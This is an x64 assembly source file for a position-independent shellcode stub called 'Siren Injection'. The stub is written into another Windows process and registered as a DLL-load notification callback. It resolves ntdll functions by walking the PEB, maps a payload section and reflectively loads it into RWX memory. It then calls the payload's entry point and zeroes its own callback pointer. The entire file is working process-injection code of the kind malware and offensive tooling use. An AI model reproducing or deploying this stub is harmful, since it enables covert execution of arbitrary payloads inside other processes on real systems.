/* src/stub/siren_stub_x64_gas.S
 *
 * Siren Injection — self-contained PIC shellcode blob (GAS / MinGW, x64)
 *
 * CONSTRAINT: Everything between siren_stub_code and siren_stub_code_end
 * is extracted verbatim and written into the target process.  Every
 * function call is RIP-relative *within* the blob — the relative distances
 * do not change on extraction, so they remain correct at any load address.
 * NO symbol in this range may reference anything outside it.
 *
 * Windows x64 callback signature (LDR_DLL_NOTIFICATION_FUNCTION):
 *   rcx = ULONG  NotificationReason
 *   rdx = PVOID  NotificationData
 *   r8  = PVOID  Context  ← HANDLE value of the payload section
 */

    .intel_syntax noprefix
    .text
    .align 16

    .global siren_stub_code
    .global siren_stub_code_size
    .global siren_stub_handle_patch_offset
    .global siren_stub_entry_offset_patch_offset
    .global sr_find_module_pic
    .global sr_find_export_pic

/* ═══════════════════════════════════════════════════════════════════
 * BLOB START
 * ═══════════════════════════════════════════════════════════════════
 */
siren_stub_code:
    /* Jump over the embedded string table. */
    jmp .Lcode_start

    /* Strings placed inline so RIP-relative LEA works after extraction. */
    .align 1
.Lstr_ntdll:    .asciz "ntdll.dll"
.Lstr_ntmvos:   .asciz "NtMapViewOfSection"
.Lstr_ntumvos:  .asciz "NtUnmapViewOfSection"
.Lstr_ntclose:  .asciz "NtClose"
.Lstr_ntalloc:  .asciz "NtAllocateVirtualMemory"
.Lstr_ntflush:  .asciz "NtFlushInstructionCache"
.Lstr_k32:      .asciz "kernel32.dll"
.Lstr_lllib:    .asciz "LoadLibraryA"

    .align 8
.Lcode_start:

/* ──────────────────────────────────────────────────────────────────
 * sr_find_module_pic
 * Walk PEB.InMemoryOrderModuleList for a module by ASCII name.
 * Input:  rcx = ASCII name (NUL-terminated, case-insensitive)
 * Output: rax = DllBase or 0
 * Clobbers: rax, rdx, r8-r11 (all volatile)
 * ──────────────────────────────────────────────────────────────────
 */
sr_find_module_pic:
    mov  rax, gs:[0x60]              /* PEB */
    mov  rax, [rax + 0x18]           /* PEB.Ldr */
    lea  r10, [rax + 0x20]           /* &InMemoryOrderModuleList head */
    mov  r11, [r10]                  /* head->Flink */
.Lfm_loop:
    cmp  r11, r10
    je  .Lfm_notfound
    mov  r9, [r11 + 0x20]           /* DllBase */
    test r9, r9
    jz  .Lfm_next
    cmp  r9, 0x10000
    jb  .Lfm_next
    movzx edx, word ptr [r11 + 0x38] /* BaseDllName.Length (bytes) */
    shr  edx, 1                       /* length in wchars */
    mov  r8,  [r11 + 0x40]           /* BaseDllName.Buffer */
    push rcx
    push r11
    xor  eax, eax
.Lfm_cmp:
    test edx, edx
    jz  .Lfm_check_end
    movzx eax, byte ptr [rcx]        /* ASCII char */
    test al, al
    jz  .Lfm_miss
    cmp  al, 'A'
    jb  .Lfm_nolo
    cmp  al, 'Z'
    ja  .Lfm_nolo
    or   al, 0x20                    /* to lower */
.Lfm_nolo:
    movzx r11d, word ptr [r8]        /* Unicode char */
    cmp  r11d, 'A'
    jb  .Lfm_nolo2
    cmp  r11d, 'Z'
    ja  .Lfm_nolo2
    or   r11d, 0x20
.Lfm_nolo2:
    cmp  eax, r11d
    jne .Lfm_miss
    inc  rcx
    add  r8, 2
    dec  edx
    jmp .Lfm_cmp
.Lfm_check_end:
    movzx eax, byte ptr [rcx]
    test al, al
    jnz .Lfm_miss
    pop  r11
    pop  rcx
    mov  rax, r9
    ret
.Lfm_miss:
    pop  r11
    pop  rcx
.Lfm_next:
    mov  r11, [r11]
    jmp .Lfm_loop
.Lfm_notfound:
    xor  eax, eax
    ret

/* ──────────────────────────────────────────────────────────────────
 * sr_find_export_pic
 * Walk a module's export directory to find a named function.
 * Input:  rcx = module base, rdx = ASCII function name
 * Output: rax = function absolute address or 0
 * Saves/restores: rbx, rsi, rdi, r12-r15
 * ──────────────────────────────────────────────────────────────────
 */
sr_find_export_pic:
    push rbx; push rsi; push rdi
    push r12; push r13; push r14; push r15

    mov  r12, rcx                    /* module base */
    mov  r13, rdx                    /* function name */

    mov  eax, dword ptr [r12 + 0x3C] /* e_lfanew */
    add  rax, r12                    /* NT headers */

    /* Export dir: NT+0x18+0x70 = NT+0x88 */
    mov  esi, dword ptr [rax + 0x88] /* DataDir[0].VirtualAddress */
    test esi, esi
    jz  .Lfe_notfound
    mov  ebx, dword ptr [rax + 0x8C] /* DataDir[0].Size */

    lea  r14, [r12 + rsi]            /* export directory */

    mov  r15d, dword ptr [r14 + 0x18] /* NumberOfNames */
    test r15d, r15d
    jz  .Lfe_notfound

    mov  ecx, dword ptr [r14 + 0x20] /* AddressOfNames RVA */
    lea  rdi, [r12 + rcx]            /* name pointer array */

    xor  r9d, r9d
.Lfe_loop:
    cmp  r9d, r15d
    jae .Lfe_notfound

    mov  ecx, dword ptr [rdi + r9*4]
    lea  rcx, [r12 + rcx]            /* current export name */

    push rdi; push r9
    mov  rsi, r13                    /* needle */
.Lfe_strcmp:
    mov  al,  byte ptr [rcx]
    mov  dl,  byte ptr [rsi]
    cmp  al, dl
    jne .Lfe_no_match
    test al, al
    jz  .Lfe_match
    inc  rcx; inc rsi
    jmp .Lfe_strcmp
.Lfe_no_match:
    pop  r9; pop rdi
    inc  r9d
    jmp .Lfe_loop
.Lfe_match:
    pop  r9; pop rdi

    /* Ordinal lookup */
    mov  ecx, dword ptr [r14 + 0x24] /* AddressOfNameOrdinals RVA */
    lea  rcx, [r12 + rcx]
    movzx ecx, word ptr [rcx + r9*2]

    /* Function RVA */
    mov  edx, dword ptr [r14 + 0x1C] /* AddressOfFunctions RVA */
    lea  rdx, [r12 + rdx]
    mov  eax, dword ptr [rdx + rcx*4]

    /* Skip forwarders (RVA inside export directory) */
    cmp  eax, esi
    jb  .Lfe_ok
    lea  ecx, [esi + ebx]
    cmp  eax, ecx
    jae .Lfe_ok
    xor  eax, eax
    jmp .Lfe_done
.Lfe_ok:
    add  rax, r12
    jmp .Lfe_done
.Lfe_notfound:
    xor  eax, eax
.Lfe_done:
    pop  r15; pop r14; pop r13; pop r12
    pop  rdi; pop rsi; pop rbx
    ret

/* ──────────────────────────────────────────────────────────────────
 * sr_refl_load_pic
 * Inline PIC reflective PE loader.  Executes entirely in the target.
 * Input:  rcx = section_view (mapped PE, raw file layout)
 *         rdx = (unused — size is read from the PE headers)
 * Errors: silently ignored (payload just doesn't load).
 * Saves/restores: rbx, rsi, rdi, r12-r15, rbp/rsp
 *
 * rbp-relative locals (allocated by prologue):
 *   [rbp-0x10] = NtAllocateVirtualMemory
 *   [rbp-0x18] = NtFlushInstructionCache
 *   [rbp-0x20] = alloc_base  (PVOID, in/out for NtAlloc)
 *   [rbp-0x28] = alloc_size  (SIZE_T, in/out for NtAlloc)
 *   [rbp-0x30] = ntdll base  (scratch after Nt funcs are resolved)
 *   [rbp-0x38] = IAT write ptr (import loop)
 *
 * Non-volatile registers used across subroutine calls:
 *   r12 = section_view
 *   r13 = NT headers ptr (r12 + e_lfanew)
 *   r14 = allocated image base
 *   r15 = delta = r14 - preferred_ImageBase
 *   rbx = dep module base (import loop) / section counter (section loop)
 *   rsi = scan pointer (section headers / reloc blocks / import descs)
 *   rdi = ILT read pointer (import loop) / rep-movsb dst
 *
 * Stack alignment after prologue 7-push:
 *   rsp is 8-misaligned (56 % 16 == 8).
 *   All sub-rsp before CALL must add 8 to re-align:
 *     sub rsp, 0x28 (40)  for ≤5 register args (shadow only)
 *     sub rsp, 0x38 (56)  for 6 args (shadow + 2 stack slots)
 *     sub rsp, 0x58 (88)  for 10 args (shadow + 6 stack slots)
 * ──────────────────────────────────────────────────────────────────
 */
.Lrefl_load_pic:
    push rbp
    mov  rbp, rsp
    sub  rsp, 0xC0
    and  rsp, -16
    push rbx; push rsi; push rdi
    push r12; push r13; push r14; push r15
    /* rsp now 8-off from 16-alignment. */

    mov  r12, rcx                    /* section_view */

    /* ── 1. Validate PE ─────────────────────────────────────── */
    movzx eax, word ptr [r12]
    cmp  ax, 0x5A4D                  /* MZ */
    jne .Lrl_done

    mov  eax, dword ptr [r12 + 0x3C] /* e_lfanew */
    lea  r13, [r12 + rax]            /* NT headers */

    cmp  dword ptr [r13], 0x00004550 /* PE\0\0 */
    jne .Lrl_done

    /* ── 2. Locate ntdll ────────────────────────────────────── */
    sub  rsp, 0x28
    lea  rcx, [rip + .Lstr_ntdll]
    call sr_find_module_pic
    add  rsp, 0x28
    test rax, rax
    jz  .Lrl_done
    mov  qword ptr [rbp - 0x30], rax  /* ntdll base */

    /* ── 3. Resolve NtAllocateVirtualMemory ─────────────────── */
    sub  rsp, 0x28
    mov  rcx, qword ptr [rbp - 0x30]
    lea  rdx, [rip + .Lstr_ntalloc]
    call sr_find_export_pic
    add  rsp, 0x28
    test rax, rax
    jz  .Lrl_done
    mov  qword ptr [rbp - 0x10], rax

    /* ── 4. Resolve NtFlushInstructionCache ─────────────────── */
    sub  rsp, 0x28
    mov  rcx, qword ptr [rbp - 0x30]
    lea  rdx, [rip + .Lstr_ntflush]
    call sr_find_export_pic
    add  rsp, 0x28
    test rax, rax
    jz  .Lrl_done
    mov  qword ptr [rbp - 0x18], rax

    /* ── 5. NtAllocateVirtualMemory for image ───────────────── */
    /* alloc_base = preferred ImageBase (NT+0x30) */
    mov  r14, qword ptr [r13 + 0x30]
    mov  qword ptr [rbp - 0x20], r14

    /* alloc_size = SizeOfImage (NT+0x50); mov e32 auto-zero-extends to r64 */
    mov  eax, dword ptr [r13 + 0x50]
    mov  qword ptr [rbp - 0x28], rax

    /* NtAllocateVirtualMemory(-1, &base, 0, &size, MEM_COMMIT|MEM_RESERVE, PAGE_ERW) */
    sub  rsp, 0x38               /* shadow(32) + 2 stack args(16), aligned */
    mov  rcx, -1
    lea  rdx, [rbp - 0x20]
    xor  r8, r8
    lea  r9,  [rbp - 0x28]
    mov  qword ptr [rsp + 0x20], 0x3000  /* MEM_COMMIT | MEM_RESERVE */
    mov  qword ptr [rsp + 0x28], 0x40   /* PAGE_EXECUTE_READWRITE */
    call qword ptr [rbp - 0x10]
    add  rsp, 0x38
    test eax, eax
    jns .Lrl_alloc_ok

    /* Retry: let OS choose base */
    xor  rax, rax
    mov  qword ptr [rbp - 0x20], rax
    mov  eax, dword ptr [r13 + 0x50]
    mov  qword ptr [rbp - 0x28], rax    /* auto zero-extended */

    sub  rsp, 0x38
    mov  rcx, -1
    lea  rdx, [rbp - 0x20]
    xor  r8, r8
    lea  r9,  [rbp - 0x28]
    mov  qword ptr [rsp + 0x20], 0x3000
    mov  qword ptr [rsp + 0x28], 0x40
    call qword ptr [rbp - 0x10]
    add  rsp, 0x38
    test eax, eax
    js  .Lrl_done

.Lrl_alloc_ok:
    mov  r14, qword ptr [rbp - 0x20]  /* r14 = allocated image base */
    test r14, r14
    jz  .Lrl_done

    /* ── 6. Compute delta ───────────────────────────────────── */
    mov  r15, r14
    sub  r15, qword ptr [r13 + 0x30]  /* delta = actual - preferred */

    /* ── 7. Copy headers (rep movsb) ───────────────────────── */
    mov  ecx, dword ptr [r13 + 0x54]  /* SizeOfHeaders (NT+0x54) */
    mov  rdi, r14
    mov  rsi, r12
    rep movsb

    /* ── 8. Copy sections ───────────────────────────────────── */
    movzx rbx, word ptr [r13 + 0x06]  /* NumberOfSections (NT+0x06) */
    movzx rax, word ptr [r13 + 0x14]  /* SizeOfOptionalHeader (NT+0x14) */
    lea  rsi, [r13 + 0x18]
    add  rsi, rax                     /* rsi = first section header */

.Lrl_sec_loop:
    test rbx, rbx
    jz  .Lrl_reloc

    mov  eax, dword ptr [rsi + 0x10]  /* SizeOfRawData */
    test eax, eax
    jz  .Lrl_sec_next

    push rbx; push rsi

    mov  edx, dword ptr [rsi + 0x0C]  /* VirtualAddress */
    mov  ecx, dword ptr [rsi + 0x14]  /* PointerToRawData */
    lea  rdi, [r14 + rdx]             /* dst = image + VA */
    lea  rsi, [r12 + rcx]             /* src = view + file offset */
    mov  ecx, eax                     /* count (auto zero-extends ecx→rcx) */
    rep movsb

    pop  rsi; pop rbx

.Lrl_sec_next:
    add  rsi, 40                      /* sizeof IMAGE_SECTION_HEADER */
    dec  rbx
    jmp .Lrl_sec_loop

    /* ── 9. Base relocations ────────────────────────────────── */
.Lrl_reloc:
    test r15, r15
    jz  .Lrl_import                   /* delta = 0, nothing to do */

    /* DataDir[5] (BaseReloc): NT+0xB0 */
    mov  eax, dword ptr [r13 + 0xB0]  /* reloc dir RVA */
    test eax, eax
    jz  .Lrl_import
    mov  ecx, dword ptr [r13 + 0xB4]  /* reloc dir size */
    test ecx, ecx
    jz  .Lrl_import

    lea  rsi, [r14 + rax]             /* rsi = first reloc block */
    /* ecx is already zero-extended in rcx after mov ecx,... */
    lea  rbx, [rsi + rcx]             /* rbx = end of reloc region */

.Lrl_blk:
    cmp  rsi, rbx
    jae .Lrl_import

    mov  r8d, dword ptr [rsi + 4]     /* SizeOfBlock */
    cmp  r8d, 8
    jb  .Lrl_import                   /* malformed */

    mov  ecx, r8d
    sub  ecx, 8
    shr  ecx, 1                       /* entry count */
    mov  edx, dword ptr [rsi]         /* block.VirtualAddress */
    lea  rdi, [rsi + 8]               /* first entry (uint16_t*) */

.Lrl_ent:
    test ecx, ecx
    jz  .Lrl_blk_next

    movzx r9d, word ptr [rdi]
    mov  r10d, r9d
    shr  r10d, 12                     /* type = top 4 bits */
    and  r9d, 0x0FFF                  /* offset = bottom 12 bits */

    cmp  r10d, 10                     /* IMAGE_REL_BASED_DIR64 */
    jne .Lrl_ent_skip

    push rdx
    add  edx, r9d                     /* edx = block.VA + offset */
    add  rdx, r14                     /* rdx = &target_ptr in image */
    mov  rax, qword ptr [rdx]
    add  rax, r15                     /* apply delta */
    mov  qword ptr [rdx], rax
    pop  rdx

.Lrl_ent_skip:
    add  rdi, 2
    dec  ecx
    jmp .Lrl_ent

.Lrl_blk_next:
    /* r8d was written by mov r8d,... so r8 is already zero-extended */
    add  rsi, r8
    jmp .Lrl_blk

    /* ── 10. Import table resolution ───────────────────────── */
.Lrl_import:
    /* DataDir[1] (Import): NT+0x90 */
    mov  eax, dword ptr [r13 + 0x90]
    test eax, eax
    jz  .Lrl_flush
    mov  ecx, dword ptr [r13 + 0x94]
    test ecx, ecx
    jz  .Lrl_flush

    lea  rsi, [r14 + rax]             /* rsi = import descriptor array */

.Lrl_imp_desc:
    mov  eax, dword ptr [rsi + 0x0C]  /* Name RVA */
    test eax, eax
    jz  .Lrl_flush                    /* null terminator */

    /* Find module */
    sub  rsp, 0x28
    lea  rcx, [r14 + rax]             /* DLL name in image */
    call sr_find_module_pic
    add  rsp, 0x28
    mov  rbx, rax                     /* dep base or 0 */

    test rbx, rbx
    jnz .Lrl_imp_have_base

    /* Not loaded: try LoadLibraryA from kernel32 */
    sub  rsp, 0x28
    lea  rcx, [rip + .Lstr_k32]
    call sr_find_module_pic
    add  rsp, 0x28
    test rax, rax
    jz  .Lrl_imp_have_base            /* no kernel32, skip */

    sub  rsp, 0x28
    mov  rcx, rax
    lea  rdx, [rip + .Lstr_lllib]
    call sr_find_export_pic
    add  rsp, 0x28
    test rax, rax
    jz  .Lrl_imp_have_base

    /* Call LoadLibraryA(name) — safe only if NOT under loader lock,
       but skip if we're inside a DLL notification (loader lock held).
       For safety we skip; imports must already be loaded.            */
    /* xchg rax, rbx (intentionally skipped) */

.Lrl_imp_have_base:
    /* rbx = dep base or 0 */

    /* Set up ILT (read) and IAT (write) pointers. */
    mov  eax, dword ptr [rsi]          /* OriginalFirstThunk */
    test eax, eax
    jnz .Lrl_has_ilt
    mov  eax, dword ptr [rsi + 0x10]  /* FirstThunk (use as ILT) */
.Lrl_has_ilt:
    lea  rdi, [r14 + rax]             /* rdi = ILT ptr */

    mov  eax, dword ptr [rsi + 0x10]  /* FirstThunk */
    lea  rax, [r14 + rax]
    mov  qword ptr [rbp - 0x38], rax  /* [rbp-0x38] = IAT write ptr */

.Lrl_thunk:
    mov  rax, qword ptr [rdi]         /* ILT thunk value */
    test rax, rax
    jz  .Lrl_thunk_done

    xor  r10, r10                     /* r10 = resolved addr (0 = default) */
    test rbx, rbx
    jz  .Lrl_thunk_patch              /* no dep base → write 0 */

    /* Check ordinal bit (bit 63): test with itself is sign-based */
    test rax, rax
    js  .Lrl_thunk_ord

    /* Import by name: clear bit 63, leaving the RVA to IMAGE_IMPORT_BY_NAME */
    btr  rax, 63
    sub  rsp, 0x28
    mov  rcx, rbx
    lea  rdx, [r14 + rax + 2]
    call sr_find_export_pic
    add  rsp, 0x28
    mov  r10, rax
    jmp .Lrl_thunk_patch

.Lrl_thunk_ord:
    /* Import by ordinal: low 16 bits = ordinal number */
    movzx rax, ax

    /* Quick ordinal resolve without calling sr_find_export_pic */
    push rbx
    mov  r10d, dword ptr [rbx + 0x3C] /* e_lfanew */
    add  r10, rbx                     /* NT headers of dep */
    mov  r11d, dword ptr [r10 + 0x88] /* Export dir RVA */
    test r11d, r11d
    jz  .Lrl_ord_done

    lea  r10, [rbx + r11]             /* export directory */
    mov  r11d, dword ptr [r10 + 0x10] /* OrdinalBase */
    sub  rax, r11                     /* index = ordinal - base */
    js  .Lrl_ord_done
    mov  r11d, dword ptr [r10 + 0x14] /* NumberOfFunctions */
    cmp  rax, r11
    jae .Lrl_ord_done

    mov  r11d, dword ptr [r10 + 0x1C] /* AddressOfFunctions RVA */
    lea  r10, [rbx + r11]
    mov  r11d, dword ptr [r10 + rax*4] /* function RVA */
    test r11d, r11d
    jz  .Lrl_ord_done
    lea  r10, [rbx + r11]             /* absolute address */
    pop  rbx
    jmp .Lrl_thunk_patch

.Lrl_ord_done:
    xor  r10, r10
    pop  rbx

.Lrl_thunk_patch:
    mov  rax, qword ptr [rbp - 0x38]  /* IAT write ptr */
    mov  qword ptr [rax], r10
    add  rdi, 8                        /* advance ILT */
    add  qword ptr [rbp - 0x38], 8    /* advance IAT */
    jmp .Lrl_thunk

.Lrl_thunk_done:
    add  rsi, 20                      /* next IMAGE_IMPORT_DESCRIPTOR */
    jmp .Lrl_imp_desc

    /* ── 11. Flush instruction cache ────────────────────────── */
.Lrl_flush:
    sub  rsp, 0x28
    mov  rcx, -1
    mov  rdx, r14
    mov  r8d, dword ptr [r13 + 0x50]  /* SizeOfImage (auto zero-extends r8) */
    call qword ptr [rbp - 0x18]       /* NtFlushInstructionCache */
    add  rsp, 0x28

    /* ── 12. Call DllMain ───────────────────────────────────── */
    mov  eax, dword ptr [r13 + 0x28]  /* AddressOfEntryPoint (NT+0x28) */
    test eax, eax
    jz  .Lrl_done

    lea  rbx, [r14 + rax]             /* DllMain pointer */
    sub  rsp, 0x28
    mov  rcx, r14                     /* hinstDLL */
    mov  rdx, 1                       /* DLL_PROCESS_ATTACH */
    xor  r8, r8
    call rbx
    add  rsp, 0x28

.Lrl_done:
    pop  r15; pop r14; pop r13; pop r12
    pop  rdi; pop rsi; pop rbx
    mov  rsp, rbp
    pop  rbp
    ret

/* ──────────────────────────────────────────────────────────────────
 * SirenNotifyStub  (the LDR_DLL_NOTIFICATION_FUNCTION callback)
 *
 * rcx = NotificationReason  (1=load, 2=unload)
 * rdx = NotificationData
 * r8  = Context = HANDLE of the payload section in this process
 *
 * Steps:
 *   1. Find ntdll, resolve NtMapViewOfSection
 *   2. Map the section (RW) into the current process
 *   3. Run the reflective loader on the mapped view
 *   4. Unmap the section view
 *   5. Close the section handle
 *   6. Zero entry->Callback (NOP-self) to prevent re-entry
 *
 * rbp-relative locals:
 *   [rbp-0x10] = mapped Base (in/out, NtMapViewOfSection)
 *   [rbp-0x18] = ViewSize   (in/out, NtMapViewOfSection)
 * ──────────────────────────────────────────────────────────────────
 */
    .align 16
SirenNotifyStub:
    push rbp
    mov  rbp, rsp
    sub  rsp, 0xC0
    and  rsp, -16
    push rbx; push rsi; push rdi
    push r12; push r13; push r14; push r15
    /* rsp is 8-off (7 pushes of 8 bytes each). */

    mov  r12, rcx              /* NotificationReason */
    mov  r13, rdx              /* NotificationData   */
    mov  r14, r8               /* Context = HANDLE   */

    /* ── 1. Find ntdll ─────────────────────────────────────── */
    sub  rsp, 0x28
    lea  rcx, [rip + .Lstr_ntdll]
    call sr_find_module_pic
    add  rsp, 0x28
    test rax, rax
    jz  .Lstub_done
    mov  r15, rax              /* ntdll base */

    /* ── 2. NtMapViewOfSection ──────────────────────────────── */
    sub  rsp, 0x28
    mov  rcx, r15
    lea  rdx, [rip + .Lstr_ntmvos]
    call sr_find_export_pic
    add  rsp, 0x28
    test rax, rax
    jz  .Lstub_done
    mov  rbx, rax              /* NtMapViewOfSection */

    /* ── 3. Map section (RW) into current process ───────────── */
    xor  eax, eax
    mov  qword ptr [rbp - 0x10], rax   /* Base = NULL (out) */
    mov  qword ptr [rbp - 0x18], rax   /* ViewSize = 0 (out) */

    /* NtMapViewOfSection has 10 args → sub rsp, 0x58 (88) for alignment */
    sub  rsp, 0x58
    mov  rcx, r14              /* SectionHandle */
    mov  rdx, -1               /* ProcessHandle = current */
    lea  r8,  [rbp - 0x10]    /* &BaseAddress */
    xor  r9, r9                /* ZeroBits */
    xor  eax, eax
    mov  qword ptr [rsp + 0x20], rax   /* CommitSize = 0 */
    mov  qword ptr [rsp + 0x28], rax   /* SectionOffset = NULL */
    lea  rax, [rbp - 0x18]
    mov  qword ptr [rsp + 0x30], rax   /* &ViewSize */
    mov  qword ptr [rsp + 0x38], 2     /* ViewUnmap */
    xor  eax, eax
    mov  qword ptr [rsp + 0x40], rax   /* AllocationType = 0 */
    mov  qword ptr [rsp + 0x48], 4     /* PAGE_READWRITE */
    call rbx
    add  rsp, 0x58

    test eax, eax
    js  .Lstub_unmap
    mov  rsi, qword ptr [rbp - 0x10]  /* mapped base */
    test rsi, rsi
    jz  .Lstub_unmap

    /* ── 4. Reflective load ─────────────────────────────────── */
    sub  rsp, 0x28
    mov  rcx, rsi              /* section_view */
    mov  rdx, qword ptr [rbp - 0x18]  /* view_size */
    call .Lrefl_load_pic
    add  rsp, 0x28

    /* ── 5. NtUnmapViewOfSection ────────────────────────────── */
.Lstub_unmap:
    sub  rsp, 0x28
    mov  rcx, r15
    lea  rdx, [rip + .Lstr_ntumvos]
    call sr_find_export_pic
    add  rsp, 0x28
    test rax, rax
    jz  .Lstub_close
    sub  rsp, 0x28
    mov  rcx, -1
    mov  rdx, rsi
    call rax               /* NtUnmapViewOfSection */
    add  rsp, 0x28

    /* ── 6. NtClose(section handle) ─────────────────────────── */
.Lstub_close:
    sub  rsp, 0x28
    mov  rcx, r15
    lea  rdx, [rip + .Lstr_ntclose]
    call sr_find_export_pic
    add  rsp, 0x28
    test rax, rax
    jz  .Lstub_nop
    sub  rsp, 0x28
    mov  rcx, r14
    call rax               /* NtClose */
    add  rsp, 0x28

    /* ── 7. NOP-self: zero entry->Callback ──────────────────── */
    /* entry->Callback is at offset 0x10 within siren_ldr_notify_entry
       (= after LIST_ENTRY which is 16 bytes = Flink + Blink).
       We read stub_entry_offset_slot to find the entry offset from
       the blob base, then add it to [rip + siren_stub_code].         */
.Lstub_nop:
    lea  rax, [rip + .Lstub_entry_off]
    mov  rax, qword ptr [rax]         /* entry offset within blob */
    lea  rcx, [rip + siren_stub_code] /* blob start (runtime address) */
    add  rcx, rax                     /* entry address */
    xor  eax, eax
    mov  qword ptr [rcx + 0x10], rax  /* zero Callback field */

.Lstub_done:
    pop  r15; pop r14; pop r13; pop r12
    pop  rdi; pop rsi; pop rbx
    mov  rsp, rbp
    pop  rbp
    ret

/* ── Slots patched by siren_stub.c before WriteProcessMemory ── */
    .align 8
.Lstub_entry_off:                    /* patched with entry offset */
    .quad 0

    .align 8
.Lstub_handle_slot:                  /* patched with HANDLE value */
    .quad 0xDEADBEEFCAFEBABE

/* ═══════════════════════════════════════════════════════════════════
 * BLOB END
 * ═══════════════════════════════════════════════════════════════════
 */
siren_stub_code_end:

/* ── Exported metadata (NOT part of the blob) ─────────────────── */
    .align 8
siren_stub_code_size:
    .quad siren_stub_code_end - siren_stub_code

siren_stub_handle_patch_offset:
    .quad .Lstub_handle_slot - siren_stub_code

siren_stub_entry_offset_patch_offset:
    .quad .Lstub_entry_off - siren_stub_code
